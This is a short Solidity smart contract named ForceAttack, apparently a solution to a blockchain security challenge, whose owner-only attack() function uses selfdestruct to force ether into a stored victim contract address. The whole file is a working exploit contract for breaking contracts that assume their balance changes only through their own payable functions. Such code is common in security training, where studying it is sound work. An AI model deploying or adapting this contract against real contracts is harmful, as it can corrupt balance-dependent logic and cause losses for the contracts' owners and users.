// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";

contract ForceAttack is Ownable {
    address public victimAddress;

    constructor(address addr) {
        victimAddress = addr;
    }

    function attack() external payable onlyOwner {
        if (msg.value == 0) revert();

        selfdestruct(payable(victimAddress));
    }
}
